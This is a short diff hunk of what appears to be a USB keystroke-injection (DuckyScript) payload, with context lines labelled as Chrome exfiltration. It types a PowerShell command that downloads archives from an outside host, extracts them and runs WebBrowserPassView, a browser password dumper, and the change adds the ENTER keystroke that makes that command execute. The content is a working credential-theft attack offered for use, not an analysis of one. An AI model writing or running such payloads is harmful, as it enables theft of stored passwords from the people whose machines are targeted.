@@ -75,6 +75,7 @@ ENTER
 REM END OF CHROME EXFIL
 DELAY 1000
 STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip ; .\WebBrowserPassView.exe
+ENTER
 DELAY 10000
 CTRL A
 DELAY 500
